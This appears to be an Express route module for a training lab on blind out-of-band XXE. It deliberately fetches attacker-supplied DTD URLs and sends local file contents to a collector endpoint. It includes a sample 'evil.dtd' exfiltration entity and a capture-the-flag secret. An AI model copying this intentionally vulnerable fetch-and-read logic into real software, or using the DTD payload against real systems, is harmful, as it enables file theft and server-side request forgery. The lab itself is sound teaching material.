// labs/xxe-oob-exfil.js
// VULNERABILITY: Out-of-band (blind) XXE (CWE-611). The response never
// reflects file contents directly -- but the parser fetches externally
// referenced DTDs over real HTTP and expands entities inside them, so an
// attacker-hosted DTD can make the SERVER issue an outbound request that
// carries a local file's contents to a listener the attacker controls.
//
// Implementation note: to stay self-contained (no external network needed)
// this app itself doubles as both the "exploit server" (hosting your DTD,
// session-scoped) and the "collector" that receives the exfiltrated data --
// exactly like PortSwigger's own OOB XXE labs use their built-in exploit
// server. The DTD syntax supported is a deliberately simplified subset of
// real XML parameter entities (a single `FILE:<name>` token substitution),
// not a full DTD engine.
const express = require("express");
const fs = require("fs");
const path = require("path");
const router = express.Router();

const labDir = path.join(__dirname, "..", "db", "xxe-oob-fs");
if (!fs.existsSync(labDir)) fs.mkdirSync(labDir, { recursive: true });
const secretPath = path.join(labDir, "secret.txt");
if (!fs.existsSync(secretPath)) fs.writeFileSync(secretPath, "ZDS{00b_xxe_3xf1ltr4t3s_v14_dtd_f3tch}\n");

function getState(req) {
  if (!req.session.xxeOob) {
    req.session.xxeOob = { dtd: `<!ENTITY % collect SYSTEM "http://127.0.0.1:${process.env.PORT || 3000}/labs/xxe-oob-exfil/collector?data=FILE:secret.txt">\n%collect;`, received: null };
  }
  return req.session.xxeOob;
}

router.get("/", (req, res) => {
  const state = getState(req);
  res.render("labs/xxe-oob-exfil", { dtd: state.dtd, received: state.received, xmlSample: defaultXml(req), result: null });
});

router.post("/craft-dtd", (req, res) => {
  const state = getState(req);
  state.dtd = req.body.dtd || state.dtd;
  res.render("labs/xxe-oob-exfil", { dtd: state.dtd, received: state.received, xmlSample: defaultXml(req), result: null });
});

router.get("/evil.dtd", (req, res) => {
  const state = getState(req);
  res.set("Content-Type", "application/xml-dtd");
  res.send(state.dtd);
});

// --- VULNERABLE: fetches the externally-referenced DTD over real HTTP and
// "expands" its FILE: token against the local filesystem. ---
router.post("/import", async (req, res) => {
  const xml = req.body.xml || "";
  const state = getState(req);
  const sysMatch = xml.match(/SYSTEM\s+"([^"]+)"/);
  let result = null;
  if (sysMatch) {
    try {
      const dtdUrl = sysMatch[1];
      const r = await fetch(dtdUrl, { signal: AbortSignal.timeout(5000) });
      const dtdText = await r.text();
      const fileMatch = dtdText.match(/SYSTEM\s+"([^"]*FILE:([\w.-]+)[^"]*)"/);
      if (fileMatch) {
        const [, urlTemplate, fileName] = fileMatch;
        const content = fs.readFileSync(path.join(labDir, fileName), "utf8").trim();
        const finalUrl = urlTemplate.replace("FILE:" + fileName, encodeURIComponent(content));
        const collectRes = await fetch(finalUrl, { signal: AbortSignal.timeout(5000) });
        result = { status: collectRes.status, message: "External DTD fetched and expanded; outbound request sent." };
      } else {
        result = { message: "DTD fetched but no FILE: token found in it." };
      }
    } catch (e) {
      result = { error: e.message };
    }
  } else {
    result = { error: "No SYSTEM reference found in submitted XML." };
  }
  res.render("labs/xxe-oob-exfil", { dtd: state.dtd, received: state.received, xmlSample: defaultXml(req), result });
});

router.get("/collector", (req, res) => {
  const state = getState(req);
  state.received = req.query.data || null;
  res.json({ ok: true });
});

router.get("/check", (req, res) => {
  const state = getState(req);
  const flag = state.received && state.received.includes("ZDS{") ? state.received.match(/ZDS\{[^}]*\}/)[0] : null;
  res.json({ received: state.received, flag });
});

function defaultXml(req) {
  return `<?xml version="1.0"?>\n<!DOCTYPE foo SYSTEM "http://127.0.0.1:${process.env.PORT || 3000}/labs/xxe-oob-exfil/evil.dtd">\n<foo>bar</foo>`;
}


router.post("/reset", (req, res) => {
  req.session.xxeOob = null;
  res.redirect("/labs/xxe-oob-exfil");
});

module.exports = router;
